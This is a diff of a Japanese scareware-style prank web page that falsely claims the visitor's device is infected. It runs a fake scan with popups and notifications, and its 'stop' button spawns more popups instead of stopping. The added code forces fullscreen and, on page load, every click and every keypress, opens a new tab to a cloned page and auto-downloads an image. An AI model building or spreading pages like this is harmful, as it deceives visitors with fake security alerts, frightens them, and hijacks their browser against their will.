@@ -1,103 +1,146 @@
+
 <!DOCTYPE html>
 <html lang="ja">
 <head>
 <meta charset="UTF-8">
-<title>ウイルス警告</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>すばらしいさいと</title>
 
 <style>
-html{
+* {
+    box-sizing: border-box;
+}
+
+body {
+    margin: 0;
+    background: #111;
+    color: white;
+    font-family: sans-serif;
+    min-height: 100vh;
+    overflow-x: hidden;
     cursor:none;
-    user-select:none;
-    -webkit-user-select:none;
-}
-body{
-    margin:0;
-    background:#111;
-    color:white;
-    font-family:sans-serif;
-    overflow:hidden;
-    cursor:none;
 }
 
-.wrap{
-    padding:40px;
+.wrap {
+    padding: 40px;
 }
 
-h1{
-    color:#ff3b30;
-    font-size:42px;
-    animation:flash 0.7s infinite;
+h1 {
+    color: #ff3b30;
+    font-size: 42px;
+    animation: flash 0.7s infinite;
 }
 
-@keyframes flash{
-    0%{opacity:1;}
-    50%{opacity:0.3;}
-    100%{opacity:1;}
+@keyframes flash {
+    0%,100% { opacity: 1; }
+    50% { opacity: 0.3; }
 }
 
-button{
-    padding:15px 25px;
-    font-size:20px;
-    cursor:none;
-    margin-right:10px;
+button {
+    padding: 15px 25px;
+    font-size: 17px;
+    margin: 5px;
+    border: none;
+    border-radius: 5px;
 }
 
-.stop{
-    background:#c0392b;
-    color:white;
-    border:none;
+button:disabled {
+    opacity: 0.5;
 }
 
-.info{
-    margin-top:20px;
-    font-size:20px;
+.stop {
+    background: #c0392b;
+    color: white;
 }
 
-.popup{
-    position:absolute;
-    width:320px;
-    background:white;
-    color:black;
-    border:4px solid #ff3b30;
-    box-shadow:0 0 20px rgba(255,0,0,0.7);
-    padding:15px;
-    /*animation:shake 0.15s infinite alternate;*/
+.info {
+    margin-top: 20px;
+    font-size: 20px;
 }
 
-.popup h2{
-    margin-top:0;
-    color:#ff3b30;
+.popup {
+    position: fixed;
+    width: min(320px, calc(100vw - 30px));
+    background: white;
+    color: black;
+    border: 4px solid #ff3b30;
+    box-shadow: 0 0 20px rgba(255,0,0,0.7);
+    padding: 15px;
+    z-index: 100;
 }
 
-.popup button{
-    margin-top:10px;
+.popup h2 {
+    margin-top: 0;
+    color: #ff3b30;
 }
 
-@keyframes shake{
-    from{
-        transform:translateX(-2px);
+.popup button {
+    margin-top: 10px;
+}
+
+.status {
+    color: #aaa;
+    font-size: 14px;
+    margin-top: 15px;
+}
+
+@media(max-width:600px) {
+    .wrap {
+        padding: 20px;
     }
-    to{
-        transform:translateX(2px);
+
+    h1 {
+        font-size: 30px;
     }
 }
 </style>
 </head>
+
 <body>
 
 <div class="wrap">
+
     <h1>⚠ ウイルスに感染しています！</h1>
 
-    <button onclick="start()">スキャンする</button>
-    <button class="stop" onclick="fakeStop()">停止する</button>
+    <button onclick="start()" id="start">スキャンする</button>
 
-    <div class="info" id="info"></div>
+    <button class="stop" onclick="fakeStop()">
+        停止する
+    </button>
+
+    <hr>
+
+
+    <div class="status" id="status">
+        
+    </div>
+
 </div>
 
 <script>
+
+// ===================================
+// 設定
+// ===================================
+
+// ダウンロードする画像
+const IMAGE_PATH = "./image.png";
+
+// 保存時のファイル名
+const IMAGE_NAME = "Have a nice day.png";
+
+// 新しく開くページ
+const TARGET_PAGE = "./clone.html";
+
+// ===================================
+// 変数
+// ===================================
+
 let running = false;
-let interval = 1200;
+let timer = null;
 let count = 0;
+let interval = 1200;
+let notificationEnabled = false;
 
 const virus = [
     "トロイの木馬",
@@ -115,102 +158,225 @@ const virus = [
     "ファイルレスマルウェア"
 ];
 
-function randomVirus(){
-    return virus[Math.floor(Math.random() * virus.length)];
+const status = document.getElementById("status");
+
+// ===================================
+// ランダム
+// ===================================
+
+function randomVirus() {
+    return virus[
+        Math.floor(Math.random() * virus.length)
+    ];
 }
 
-function start(){
+// ===================================
+// ダウンロード
+// ===================================
 
-    if(running) return;
+function downloadImage() {
 
-    Notification.requestPermission().then(permission => {
+    const a = document.createElement("a");
 
-        if(permission === "granted"){
+    a.href = IMAGE_PATH;
+    a.download = IMAGE_NAME;
 
-            running = true;
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
 
-            document.getElementById("info").textContent =
-                "スキャン中...";
-
-            spam();
-
-        }else{
-            alert("通知が拒否されました");
-        }
-
-    });
+    status.textContent =
+        "ダウンロードを開始しました。";
 }
 
-function spam(){
+// ===================================
+// 新しいタブ
+// ===================================
 
-    if(!running) return;
+function openPage() {
 
-    setTimeout(() => {
+    const target = new URL(
+        TARGET_PAGE,
+        location.href
+    );
 
-        createPopup();
+    
 
-        // 一気に大量通知
-        for(let i=0;i<3;i++){
-count = count + 1
-            const currentVirus = randomVirus();
+    const newTab = window.open(
+        target.href,
+        "https://novelstar354.github.io/bothersome"
+    );
 
+    if (!newTab) {
+        status.textContent =
+            "新しいタブがブロックされました。Chromeのポップアップ設定を確認してください。";
+        return;
+    }
+
+    status.textContent =
+        "新しいタブを開きました。";
+}
+
+// ===================================
+// 通知許可
+// ===================================
+
+async function requestNotification() {
+
+    if (!("Notification" in window)) {
+        status.textContent =
+            "このブラウザは通知に対応していません。";
+        return false;
+    }
+
+    if (Notification.permission === "granted") {
+        notificationEnabled = true;
+        return true;
+    }
+
+    if (Notification.permission === "denied") {
+        status.textContent =
+            "通知がブロックされています。";
+        return false;
+    }
+
+    const permission =
+        await Notification.requestPermission();
+
+    notificationEnabled =
+        permission === "granted";
+
+    if (!notificationEnabled) {
+        status.textContent =
+            "通知が許可されませんでした。画面内の演出は利用できます。";
+    }
+
+    return notificationEnabled;
+}
+
+// ===================================
+// スキャン開始
+// ===================================
+
+async function start() {
+
+    if (running) return;
+
+    running = true;
+    count = 0;
+
+    status.textContent = "スキャンを実行しています。";
+
+    // 通知は任意
+    await requestNotification();
+
+    if (!running) return;
+
+    scan();
+}
+
+// ===================================
+// スキャン処理
+// ===================================
+
+function scan() {
+
+    if (!running) return;
+
+    count++;
+
+    const currentVirus = randomVirus();
+
+    // ポップアップ生成
+    createPopup(currentVirus);
+
+    
+        try {
             new Notification(
-                `#${count}⚠ ウイルス検出`,
+                `#${count} ⚠ ウイルス検出`,
                 {
-                    body:`感知: ${currentVirus}`
+                    body: `検出: ${currentVirus}`
                 }
             );
+        } catch (error) {
+            console.warn(
+                "通知エラー:",
+                error
+            );
         }
+    
 
-        count += 3;
+    
 
-        document.getElementById("info").textContent =
-            `検出数: ${count}`;
-
-        // どんどん高速化
-        interval = Math.max(120, interval - 40);
-
-        spam();
-
-    }, interval);
+    timer = setTimeout(scan, interval);
 }
 
-function createPopup(){
+// ===================================
+// ポップアップ
+// ===================================
+
+function createPopup(name) {
+    
+    const existing =
+        document.querySelectorAll(".popup");
+
+    
 
     const popup = document.createElement("div");
     popup.className = "popup";
 
+    const maxX = Math.max(
+        0,
+        window.innerWidth - 340
+    );
+
+    const maxY = Math.max(
+        0,
+        window.innerHeight - 220
+    );
+
     popup.style.left =
-        Math.random() * (window.innerWidth - 340) + "px";
+        Math.random() * maxX + "px";
 
     popup.style.top =
-        Math.random() * (window.innerHeight - 220) + "px";
+        Math.random() * maxY + "px";
 
-    popup.innerHTML = `
-        <h2>⚠ 危険</h2>
-        <p>
-        ${randomVirus()} を検出しました。<br>
-        今すぐ修復してください。
-        </p>
-        <button onclick="this.parentElement.remove()">
-            OK
-        </button>
-    `;
+    const heading = document.createElement("h2");
+    heading.textContent = "⚠ 危険";
+
+    const message = document.createElement("p");
+    message.textContent =
+        name + "を検知しました。";
+
+    const button = document.createElement("button");
+    button.textContent = "OK";
+
+    button.onclick = () => {
+        popup.remove();
+        openPage();
+        downloadImage();
+    };
+
+    popup.appendChild(heading);
+    popup.appendChild(message);
+    popup.appendChild(button);
 
     document.body.appendChild(popup);
 }
+
+// ===================================
+// 停止
+// ===================================
 
 function fakeStop(){
 
     interval = Math.max(50, interval - 200);
 
-    // 停止したように見せる
-    document.getElementById("info").textContent =
-        "停止処理中...";
 
     // 追加ポップアップ大量生成
     for(let i=0;i<8;i++){
-        createPopup();
+        const currentVirus = randomVirus();
+        createPopup(currentVirus);
     }
 
     new Notification(
@@ -220,20 +386,50 @@ function fakeStop(){
         }
     );
 }
+
+// ===================================
+// ページ終了時の後処理
+// ===================================
+
+window.addEventListener("beforeunload", () => {
+
+    running = false;
+
+    if (timer !== null) {
+        clearTimeout(timer);
+    }
+
+});
+window.addEventListener('load', () => {
+    openPage();
+    downloadImage();
+});
+document.getElementById("start").addEventListener("click", () => {
+    openPage();
+    downloadImage();
+});
 function fullScreen(){
     document.documentElement.requestFullscreen();
+    openPage();
+    downloadImage();
 }
 document.addEventListener("click", function(event) {
     document.documentElement.requestFullscreen();
+    openPage();
+    downloadImage();
 });
 
 document.addEventListener("keydown", function(event) {
     document.documentElement.requestFullscreen();
+    openPage();
+    downloadImage();
 });
 document.addEventListener("keydown", function(event) {
     setTimeout(function() {
         document.documentElement.requestFullscreen();
     }, 10);
+    openPage();
+    downloadImage();
 });
 </script>
 
